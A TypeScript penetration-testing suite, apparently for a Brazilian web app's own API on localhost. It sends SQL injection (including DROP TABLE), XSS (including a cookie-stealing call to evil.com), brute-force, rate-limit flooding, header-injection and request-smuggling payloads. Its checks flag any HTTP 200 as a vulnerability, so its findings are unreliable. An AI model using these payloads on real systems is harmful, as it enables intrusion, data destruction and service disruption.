import { createLogger } from '../infra/structured-logger';

const logger = createLogger('penetration-test');

/**
 * Suite de testes de penetração real
 * Modo: HACKER REAL - Tentar quebrar tudo
 */
export class PenetrationTester {
  private baseUrl: string;
  private results: Array<{
    test: string;
    type: string;
    payload: string;
    endpoint: string;
    method: string;
    status: number;
    blocked: boolean;
    response?: any;
    error?: string;
    vulnerability?: string;
    severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  }> = [];

  constructor(baseUrl: string = 'http://localhost:3000') {
    this.baseUrl = baseUrl;
  }

  /**
   * Executa todos os testes de penetração
   */
  async runFullPenetrationTest(): Promise<void> {
    console.log('🚀 INICIANDO TESTE DE PENETRAÇÃO COMPLETO');
    console.log('🎯 MODO: HACKER REAL - TENTAR QUEBRAR TUDO\n');
    
    await this.testSQLInjectionAdvanced();
    await this.testXSSAdvanced();
    await this.testCSRFBypass();
    await this.testBruteForceAdvanced();
    await this.testRateLimitBypass();
    await this.testEdgeCases();
    await this.testHeadersInjection();
    await this.testProtocolAttacks();
    
    this.generateFinalReport();
  }

  /**
   * Teste avançado de SQL Injection
   */
  private async testSQLInjectionAdvanced(): Promise<void> {
    console.log('💉 Testando SQL Injection AVANÇADO...');
    
    const sqlPayloads = [
      // Básicos
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "admin'--",
      "admin'/*",
      
      // Avançados
      "' UNION SELECT 1,username,password,4,5 FROM users --",
      "' UNION SELECT null,username,password,null FROM users --",
      "'; DROP TABLE users; --",
      "'; INSERT INTO users VALUES('hacker','pass'); --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
      "' AND 1=(SELECT COUNT(*) FROM users) --",
      
      // Time-based
      "'; WAITFOR DELAY '00:00:05' --",
      "' AND SLEEP(5) --",
      "'; SELECT pg_sleep(5) --",
      
      // Boolean-based
      "' AND '1'='1",
      "' AND '1'='2",
      "' OR 1=1 LIMIT 1 --",
      
      // Error-based
      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
      
      // NoSQL
      "{'$ne': null}",
      "{'$gt': ''}",
      "{'$regex': '.*'}",
      
      // LDAP
      "*)(&",
      "*)(|(objectClass=*",
      
      // Com codificação
      "%27%20OR%20%271%27%3D%271",
      "%2527%2520OR%2520%25271%2527%3D%25271",
    ];

    const endpoints = [
      '/api/trpc/auth.login',
      '/api/trpc/produtos.list',
      '/api/trpc/clientes.list',
      '/api/trpc/pedidos.list',
      '/api/test',
    ];

    for (const endpoint of endpoints) {
      for (const payload of sqlPayloads) {
        try {
          const response = await fetch(`${this.baseUrl}${endpoint}`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            body: JSON.stringify({
              email: payload,
              password: 'password',
              search: payload,
              filter: payload,
            }),
          });

          const responseText = await response.text();
          const isVulnerable = 
            response.status === 200 || 
            response.status === 500 ||
            responseText.toLowerCase().includes('sql') ||
            responseText.toLowerCase().includes('syntax') ||
            responseText.toLowerCase().includes('error');

          this.results.push({
            test: 'SQL Injection',
            type: 'Advanced SQL Injection',
            payload,
            endpoint,
            method: 'POST',
            status: response.status,
            blocked: response.status >= 400 && !isVulnerable,
            response: responseText,
            vulnerability: isVulnerable ? 'SQL_INJECTION' : undefined,
            severity: isVulnerable ? 'CRITICAL' : 'INFO'
          });
        } catch (error) {
          this.results.push({
            test: 'SQL Injection',
            type: 'Advanced SQL Injection',
            payload,
            endpoint,
            method: 'POST',
            status: 0,
            blocked: true,
            error: error instanceof Error ? error.message : 'Unknown error',
            severity: 'INFO'
          });
        }
      }
    }
  }

  /**
   * Teste avançado de XSS
   */
  private async testXSSAdvanced(): Promise<void> {
    console.log('🕷️ Testando XSS AVANÇADO...');
    
    const xssPayloads = [
      // Básicos
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      
      // Avançados
      '<svg onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      
      // Bypass de filtros
      '<ScRiPt>alert("XSS")</ScRiPt>',
      '<script>alert(String.fromCharCode(88,83,83))</script>',
      '<script>alert(/XSS/.source)</script>',
      '<script>alert&#40;"XSS"&#41;</script>',
      
      // Contextos específicos
      '</script><script>alert("XSS")</script>',
      '";alert("XSS");//',
      "'-alert('XSS')-'",
      
      // Codificados
      '%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E',
      '%253Cscript%253Ealert%2528%2522XSS%2522%2529%253C/script%253E',
      
      // Poliglotes
      '<script>alert("XSS")</script><svg onload=alert("XSS")>',
      'javascript:alert("XSS")<img src=x onerror=alert("XSS")>',
      
      // DOM-based
      '<script>document.body.innerHTML="<h1>XSS</h1>"</script>',
      '<script>location.href="http://evil.com/steal?"+document.cookie</script>',
      
      // Sem parênteses
      '<script>alert`XSS`</script>',
      '<script>setTimeout(()=>alert("XSS"),0)</script>',
    ];

    const endpoints = [
      '/api/trpc/produtos.create',
      '/api/trpc/clientes.create',
      '/api/test',
      '/api/search',
    ];

    for (const endpoint of endpoints) {
      for (const payload of xssPayloads) {
        try {
          const response = await fetch(`${this.baseUrl}${endpoint}`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            body: JSON.stringify({
              nome: payload,
              descricao: payload,
              search: payload,
              callback: payload,
            }),
          });

          const responseText = await response.text();
          const isVulnerable = 
            responseText.includes(payload) ||
            responseText.includes('alert("XSS")') ||
            responseText.includes('javascript:') ||
            responseText.includes('<script>') ||
            response.status === 200;

          this.results.push({
            test: 'XSS',
            type: 'Advanced XSS',
            payload,
            endpoint,
            method: 'POST',
            status: response.status,
            blocked: response.status >= 400 && !isVulnerable,
            response: responseText,
            vulnerability: isVulnerable ? 'XSS' : undefined,
            severity: isVulnerable ? 'HIGH' : 'INFO'
          });
        } catch (error) {
          this.results.push({
            test: 'XSS',
            type: 'Advanced XSS',
            payload,
            endpoint,
            method: 'POST',
            status: 0,
            blocked: true,
            error: error instanceof Error ? error.message : 'Unknown error',
            severity: 'INFO'
          });
        }
      }
    }
  }

  /**
   * Teste de bypass de CSRF
   */
  private async testCSRFBypass(): Promise<void> {
    console.log('🔓 Testando CSRF BYPASS...');
    
    const csrfBypasses = [
      // Sem token
      { headers: {}, body: { email: 'test@test.com', password: 'password' } },
      
      // Token inválido
      { headers: { 'X-CSRF-Token': 'invalid' }, body: { email: 'test@test.com', password: 'password' } },
      
      // Token vazio
      { headers: { 'X-CSRF-Token': '' }, body: { email: 'test@test.com', password: 'password' } },
      
      // Token antigo
      { headers: { 'X-CSRF-Token': 'old-token-12345' }, body: { email: 'test@test.com', password: 'password' } },
      
      // Bypass por método
      { headers: { 'X-HTTP-Method-Override': 'POST' }, body: { email: 'test@test.com', password: 'password' } },
      
      // Bypass por header
      { headers: { 'X-Requested-With': 'XMLHttpRequest' }, body: { email: 'test@test.com', password: 'password' } },
      
      // Bypass por referer
      { headers: { 'Referer': this.baseUrl }, body: { email: 'test@test.com', password: 'password' } },
      
      // Bypass por origin
      { headers: { 'Origin': this.baseUrl }, body: { email: 'test@test.com', password: 'password' } },
    ];

    const endpoints = [
      '/api/trpc/auth.login',
      '/api/trpc/auth.register',
      '/api/trpc/clientes.create',
      '/api/trpc/produtos.create',
    ];

    for (const endpoint of endpoints) {
      for (const bypass of csrfBypasses) {
        try {
          const response = await fetch(`${this.baseUrl}${endpoint}`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
              ...bypass.headers
            },
            body: JSON.stringify(bypass.body),
          });

          const isVulnerable = response.status === 200 || response.status === 201;
          
          this.results.push({
            test: 'CSRF Bypass',
            type: 'CSRF Protection Bypass',
            payload: JSON.stringify(bypass),
            endpoint,
            method: 'POST',
            status: response.status,
            blocked: !isVulnerable,
            response: await response.text(),
            vulnerability: isVulnerable ? 'CSRF_BYPASS' : undefined,
            severity: isVulnerable ? 'HIGH' : 'INFO'
          });
        } catch (error) {
          this.results.push({
            test: 'CSRF Bypass',
            type: 'CSRF Protection Bypass',
            payload: JSON.stringify(bypass),
            endpoint,
            method: 'POST',
            status: 0,
            blocked: true,
            error: error instanceof Error ? error.message : 'Unknown error',
            severity: 'INFO'
          });
        }
      }
    }
  }

  /**
   * Teste avançado de Brute Force
   */
  private async testBruteForceAdvanced(): Promise<void> {
    console.log('🔨 Testando BRUTE FORCE AVANÇADO...');
    
    const credentials = [
      { email: 'admin@test.com', passwords: ['admin', 'password', '123456', 'admin123', 'root', 'toor'] },
      { email: 'user@test.com', passwords: ['password', '123456', 'qwerty', 'abc123', 'password123'] },
      { email: 'test@test.com', passwords: ['test', 'test123', 'password', '123456'] },
      { email: 'root@test.com', passwords: ['root', 'toor', 'admin', 'password'] },
      { email: 'administrator@test.com', passwords: ['administrator', 'admin', 'password'] },
    ];

    const bypassTechniques = [
      { headers: {}, delay: 0 },
      { headers: { 'X-Forwarded-For': '127.0.0.1' }, delay: 100 },
      { headers: { 'X-Real-IP': '192.168.1.1' }, delay: 200 },
      { headers: { 'X-Originating-IP': '10.0.0.1' }, delay: 300 },
      { headers: { 'X-Remote-IP': '172.16.0.1' }, delay: 400 },
      { headers: { 'X-Remote-Addr': '8.8.8.8' }, delay: 500 },
    ];

    for (const cred of credentials) {
      for (const technique of bypassTechniques) {
        for (const password of cred.passwords) {
          try {
            await new Promise(resolve => setTimeout(resolve, technique.delay));
            
            const response = await fetch(`${this.baseUrl}/api/trpc/auth.login`, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
                'User-Agent': `Mozilla/5.0 (${Math.random()})`,
                ...technique.headers
              },
              body: JSON.stringify({
                email: cred.email,
                password: password,
              }),
            });

            const isVulnerable = response.status === 200 || response.status === 201;
            
            this.results.push({
              test: 'Brute Force',
              type: 'Advanced Brute Force',
              payload: `${cred.email}:${password}`,
              endpoint: '/api/trpc/auth.login',
              method: 'POST',
              status: response.status,
              blocked: !isVulnerable,
              response: await response.text(),
              vulnerability: isVulnerable ? 'BRUTE_FORCE_SUCCESS' : undefined,
              severity: isVulnerable ? 'CRITICAL' : 'INFO'
            });

            if (isVulnerable) {
              console.log(`🚨 CREDENCIAIS QUEBRADAS: ${cred.email}:${password}`);
              return; // Para no primeiro sucesso
            }
          } catch (error) {
            this.results.push({
              test: 'Brute Force',
              type: 'Advanced Brute Force',
              payload: `${cred.email}:${password}`,
              endpoint: '/api/trpc/auth.login',
              method: 'POST',
              status: 0,
              blocked: true,
              error: error instanceof Error ? error.message : 'Unknown error',
              severity: 'INFO'
            });
          }
        }
      }
    }
  }

  /**
   * Teste de bypass de Rate Limit
   */
  private async testRateLimitBypass(): Promise<void> {
    console.log('⚡ Testando RATE LIMIT BYPASS...');
    
    const bypassTechniques = [
      // Headers para mudar IP
      { headers: { 'X-Forwarded-For': '1.2.3.4' } },
      { headers: { 'X-Real-IP': '5.6.7.8' } },
      { headers: { 'X-Originating-IP': '9.10.11.12' } },
      { headers: { 'X-Remote-IP': '13.14.15.16' } },
      { headers: { 'X-Remote-Addr': '17.18.19.20' } },
      
      // User-Agent rotation
      { headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' } },
      { headers: { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36' } },
      { headers: { 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36' } },
      
      // Session manipulation
      { headers: { 'Cookie': 'session=abc123' } },
      { headers: { 'Cookie': 'session=xyz789' } },
      { headers: { 'Cookie': 'session=def456' } },
      
      // HTTP methods
      { method: 'POST' },
      { method: 'PUT' },
      { method: 'PATCH' },
    ];

    for (const technique of bypassTechniques) {
      const promises = [];
      
      // Flood de requests
      for (let i = 0; i < 50; i++) {
        promises.push(
          fetch(`${this.baseUrl}/api/trpc/auth.login`, {
            method: technique.method || 'POST',
            headers: {
              'Content-Type': 'application/json',
              'User-Agent': `Mozilla/5.0 (${Math.random()})`,
              ...technique.headers
            },
            body: JSON.stringify({
              email: `test${i}@test.com`,
              password: 'password123',
            }),
          }).then(async (response) => ({
            test: 'Rate Limit Bypass',
            type: 'Rate Limit Bypass',
            payload: `Request ${i + 1}`,
            endpoint: '/api/trpc/auth.login',
            method: technique.method || 'POST',
            status: response.status,
            blocked: response.status >= 400,
            response: await response.text(),
            vulnerability: response.status === 200 ? 'RATE_LIMIT_BYPASS' : undefined,
            severity: (response.status === 200 ? 'HIGH' : 'INFO') as 'HIGH' | 'INFO'
          })).catch(error => ({
            test: 'Rate Limit Bypass',
            type: 'Rate Limit Bypass',
            payload: `Request ${i + 1}`,
            endpoint: '/api/trpc/auth.login',
            method: technique.method || 'POST',
            status: 0,
            blocked: true,
            error: error instanceof Error ? error.message : 'Unknown error',
            severity: 'INFO' as const
          }))
        );
      }

      const results = await Promise.all(promises);
      this.results.push(...(results as typeof this.results));
      
      // Verificar se algum request passou
      const successful = results.filter(r => r.status === 200 || r.status === 201);
      if (successful.length > 0) {
        console.log(`🚨 RATE LIMIT BYPASS COM SUCESSO: ${successful.length} requests passaram`);
      }
    }
  }

  /**
   * Teste de edge cases
   */
  private async testEdgeCases(): Promise<void> {
    console.log('🎲 Testando EDGE CASES...');
    
    // Payload gigante
    const giantPayload = 'A'.repeat(1000000);
    
    // Request simultânea
    const simultaneousPromises = [];
    for (let i = 0; i < 1000; i++) {
      simultaneousPromises.push(
        fetch(`${this.baseUrl}/api/test`, {
          method: 'GET',
          headers: {
            'User-Agent': `Mozilla/5.0 (${Math.random()})`,
          },
        }).then(async (response) => ({
          test: 'Edge Case',
          type: 'Simultaneous Requests',
          payload: `Request ${i + 1}`,
          endpoint: '/api/test',
          method: 'GET',
          status: response.status,
          blocked: response.status >= 400,
          response: await response.text(),
          severity: 'INFO'
        })).catch(error => ({
          test: 'Edge Case',
          type: 'Simultaneous Requests',
          payload: `Request ${i + 1}`,
          endpoint: '/api/test',
          method: 'GET',
          status: 0,
          blocked: true,
          error: error instanceof Error ? error.message : 'Unknown error',
          severity: 'INFO'
        }))
      );
    }

    // Headers gigantes
    const giantHeaders = {
      'User-Agent': 'A'.repeat(10000),
      'Referer': 'B'.repeat(10000),
      'Cookie': 'C'.repeat(10000),
      'X-Custom-Header': 'D'.repeat(10000),
    };

    // Query string gigante
    const giantQuery = '?'.repeat(10000) + 'param=' + 'A'.repeat(10000);

    const edgeCases = [
      {
        name: 'Giant Payload',
        endpoint: '/api/test',
        method: 'POST',
        body: { data: giantPayload },
        headers: {}
      },
      {
        name: 'Giant Headers',
        endpoint: '/api/test',
        method: 'GET',
        body: {},
        headers: giantHeaders
      },
      {
        name: 'Giant Query String',
        endpoint: `/api/test${giantQuery}`,
        method: 'GET',
        body: {},
        headers: {}
      },
    ];

    // Testar casos específicos
    for (const edgeCase of edgeCases) {
      try {
        const response = await fetch(`${this.baseUrl}${edgeCase.endpoint}`, {
          method: edgeCase.method,
          headers: {
            'Content-Type': 'application/json',
            ...edgeCase.headers
          },
          body: JSON.stringify(edgeCase.body),
        });

        this.results.push({
          test: 'Edge Case',
          type: edgeCase.name,
          payload: edgeCase.name,
          endpoint: edgeCase.endpoint,
          method: edgeCase.method,
          status: response.status,
          blocked: response.status >= 400,
          response: await response.text(),
          vulnerability: response.status === 200 ? 'EDGE_CASE_VULNERABILITY' : undefined,
          severity: (response.status === 200 ? 'MEDIUM' : 'INFO') as 'MEDIUM' | 'INFO'
        });
      } catch (error) {
        this.results.push({
          test: 'Edge Case',
          type: edgeCase.name,
          payload: edgeCase.name,
          endpoint: edgeCase.endpoint,
          method: edgeCase.method,
          status: 0,
          blocked: true,
          error: error instanceof Error ? error.message : 'Unknown error',
          severity: 'INFO' as const
        });
      }
    }

    // Processar requests simultâneas
    const simultaneousResults = await Promise.all(simultaneousPromises);
    this.results.push(...(simultaneousResults as typeof this.results));
  }

  /**
   * Teste de injeção em headers
   */
  private async testHeadersInjection(): Promise<void> {
    console.log('📋 Testando HEADERS INJECTION...');
    
    const maliciousHeaders = [
      { 'X-Forwarded-For': '<script>alert("XSS")</script>' },
      { 'User-Agent': 'sqlmap/1.0' },
      { 'Referer': 'javascript:alert("XSS")' },
      { 'Cookie': 'session=<script>alert("XSS")</script>' },
      { 'X-Original-URL': '/admin' },
      { 'X-Rewrite-URL': '/admin' },
      { 'X-Forwarded-Host': 'evil.com' },
      { 'X-Host': 'evil.com' },
      { 'Authorization': 'Bearer <script>alert("XSS")</script>' },
      { 'Content-Type': 'application/json; charset=<script>alert("XSS")</script>' },
      { 'Accept': 'application/json<script>alert("XSS")</script>' },
      { 'X-Forwarded-Proto': 'javascript' },
      { 'X-Forwarded-Scheme': 'javascript' },
    ];

    for (const headers of maliciousHeaders) {
      try {
        const response = await fetch(`${this.baseUrl}/api/test`, {
          method: 'GET',
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            ...headers
          },
        });

        const responseText = await response.text();
        const isVulnerable = 
          responseText.includes('<script>') ||
          responseText.includes('javascript:') ||
          responseText.includes('alert("XSS")') ||
          response.status === 200;

        this.results.push({
          test: 'Headers Injection',
          type: 'Malicious Headers',
          payload: JSON.stringify(headers),
          endpoint: '/api/test',
          method: 'GET',
          status: response.status,
          blocked: !isVulnerable,
          response: responseText,
          vulnerability: isVulnerable ? 'HEADERS_INJECTION' : undefined,
          severity: isVulnerable ? 'MEDIUM' : 'INFO'
        });
      } catch (error) {
        this.results.push({
          test: 'Headers Injection',
          type: 'Malicious Headers',
          payload: JSON.stringify(headers),
          endpoint: '/api/test',
          method: 'GET',
          status: 0,
          blocked: true,
          error: error instanceof Error ? error.message : 'Unknown error',
          severity: 'INFO'
        });
      }
    }
  }

  /**
   * Teste de ataques de protocolo
   */
  private async testProtocolAttacks(): Promise<void> {
    console.log('🌐 Testando PROTOCOL ATTACKS...');
    
    const protocolAttacks = [
      // HTTP Request Smuggling
      {
        name: 'HTTP Request Smuggling',
        headers: {
          'Content-Length': '50',
          'Transfer-Encoding': 'chunked',
        },
        body: '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n'
      },
      
      // Host header injection
      {
        name: 'Host Header Injection',
        headers: {
          'Host': 'evil.com',
          'X-Forwarded-Host': 'evil.com',
        },
        body: {}
      },
      
      // Cache poisoning
      {
        name: 'Cache Poisoning',
        headers: {
          'If-Modified-Since': '<script>alert("XSS")</script>',
          'X-Forwarded-For': 'evil.com',
        },
        body: {}
      },
      
      // Protocol downgrade
      {
        name: 'Protocol Downgrade',
        headers: {
          'Upgrade-Insecure-Requests': '0',
          'X-Forwarded-Proto': 'http',
        },
        body: {}
      },
    ];

    for (const attack of protocolAttacks) {
      try {
        const response = await fetch(`${this.baseUrl}/api/test`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            ...attack.headers
          },
          body: typeof attack.body === 'string' ? attack.body : JSON.stringify(attack.body),
        });

        const responseText = await response.text();
        const isVulnerable = response.status === 200 || response.status === 500;

        this.results.push({
          test: 'Protocol Attack',
          type: attack.name,
          payload: JSON.stringify(attack.headers),
          endpoint: '/api/test',
          method: 'POST',
          status: response.status,
          blocked: !isVulnerable,
          response: responseText,
          vulnerability: isVulnerable ? 'PROTOCOL_ATTACK' : undefined,
          severity: isVulnerable ? 'HIGH' : 'INFO'
        });
      } catch (error) {
        this.results.push({
          test: 'Protocol Attack',
          type: attack.name,
          payload: JSON.stringify(attack.headers),
          endpoint: '/api/test',
          method: 'POST',
          status: 0,
          blocked: true,
          error: error instanceof Error ? error.message : 'Unknown error',
          severity: 'INFO'
        });
      }
    }
  }

  /**
   * Gera relatório final de penetração
   */
  private generateFinalReport(): void {
    console.log('\n🎯 RELATÓRIO FINAL DE PENETRAÇÃO\n');
    
    // Agrupar resultados
    const grouped = this.results.reduce((acc, result) => {
      if (!acc[result.test]) {
        acc[result.test] = [];
      }
      acc[result.test].push(result);
      return acc;
    }, {} as Record<string, typeof this.results>);

    // Estatísticas gerais
    const totalTests = this.results.length;
    const vulnerabilities = this.results.filter(r => r.vulnerability).length;
    const blockedAttacks = this.results.filter(r => r.blocked).length;
    const criticalVulns = this.results.filter(r => r.severity === 'CRITICAL').length;
    const highVulns = this.results.filter(r => r.severity === 'HIGH').length;

    console.log('📊 ESTATÍSTICAS GERAIS:');
    console.log(`   Total de testes: ${totalTests}`);
    console.log(`   Ataques bloqueados: ${blockedAttacks} (${(blockedAttacks/totalTests*100).toFixed(1)}%)`);
    console.log(`   Vulnerabilidades encontradas: ${vulnerabilities}`);
    console.log(`   Vulnerabilidades críticas: ${criticalVulns}`);
    console.log(`   Vulnerabilidades altas: ${highVulns}`);

    // Análise por tipo
    console.log('\n🔍 ANÁLISE POR TIPO DE ATAQUE:');
    
    for (const [testName, results] of Object.entries(grouped)) {
      const vulns = results.filter(r => r.vulnerability);
      const critical = vulns.filter(r => r.severity === 'CRITICAL');
      const high = vulns.filter(r => r.severity === 'HIGH');
      
      console.log(`\n💉 ${testName}:`);
      console.log(`   Total de testes: ${results.length}`);
      console.log(`   Vulnerabilidades: ${vulns.length}`);
      console.log(`   Críticas: ${critical.length}`);
      console.log(`   Altas: ${high.length}`);
      console.log(`   Status: ${vulns.length > 0 ? '🚨 VULNERÁVEL' : '✅ SEGURO'}`);

      if (vulns.length > 0) {
        console.log('   ❌ VULNERABILIDADES ENCONTRADAS:');
        vulns.forEach(v => {
          console.log(`     - ${v.vulnerability}: ${v.endpoint} (${v.status})`);
          console.log(`       Payload: ${v.payload.substring(0, 100)}${v.payload.length > 100 ? '...' : ''}`);
        });
      }
    }

    // Verificar se sistema foi invadido
    const systemCompromised = criticalVulns > 0 || highVulns > 0;
    const systemStatus = systemCompromised ? '❌ REPROVADO' : '✅ APROVADO';
    const systemInvadible = systemCompromised ? 'SIM' : 'NÃO';

    console.log('\n🏆 RESULTADO FINAL:');
    console.log(`   Sistema invadível: ${systemInvadible}`);
    console.log(`   Status final: ${systemStatus}`);
    
    if (systemCompromised) {
      console.log('\n🚨 SISTEMA COMPROMETIDO!');
      console.log('   Recomendações imediatas:');
      console.log('   1. Corrigir vulnerabilidades críticas');
      console.log('   2. Implementar proteções adicionais');
      console.log('   3. Revisar configurações de segurança');
      console.log('   4. Realizar novo teste após correções');
    } else {
      console.log('\n✅ SISTEMA SEGURO!');
      console.log('   Todas as tentativas de ataque foram bloqueadas.');
    }

    // Salvar relatório detalhado
    const reportData = {
      timestamp: new Date().toISOString(),
      summary: {
        total: totalTests,
        blocked: blockedAttacks,
        vulnerabilities: vulnerabilities,
        critical: criticalVulns,
        high: highVulns,
        compromised: systemCompromised,
        status: systemInvadible
      },
      results: this.results
    };

    const fs = require('fs');
    fs.writeFileSync('penetration-test-report.json', JSON.stringify(reportData, null, 2));
    console.log('\n📄 Relatório detalhado salvo em: penetration-test-report.json');
  }
}

/**
 * Endpoint para executar teste de penetração
 */
export function createPenetrationTestRoutes() {
  const express = require('express');
  const router = express.Router();

  router.post('/run', async (req: any, res: any) => {
    if (process.env.NODE_ENV !== 'development') {
      return res.status(403).json({
        error: 'Forbidden',
        message: 'Penetration tests only available in development mode'
      });
    }

    const tester = new PenetrationTester(req.body.baseUrl || 'http://localhost:3000');
    
    try {
      await tester.runFullPenetrationTest();
      
      res.json({
        success: true,
        message: 'Penetration test completed',
        reportFile: 'penetration-test-report.json'
      });
    } catch (error) {
      res.status(500).json({
        error: 'Internal Server Error',
        message: 'Failed to run penetration test',
        detail: error instanceof Error ? error.message : 'Unknown error'
      });
    }
  });

  router.get('/report', (req: any, res: any) => {
    if (process.env.NODE_ENV !== 'development') {
      return res.status(403).json({
        error: 'Forbidden',
        message: 'Penetration test report only available in development mode'
      });
    }

    try {
      const fs = require('fs');
      const report = fs.readFileSync('penetration-test-report.json', 'utf8');
      res.json(JSON.parse(report));
    } catch (error) {
      res.status(404).json({
        error: 'Not Found',
        message: 'Penetration test report not found'
      });
    }
  });

  return router;
}

export default PenetrationTester;
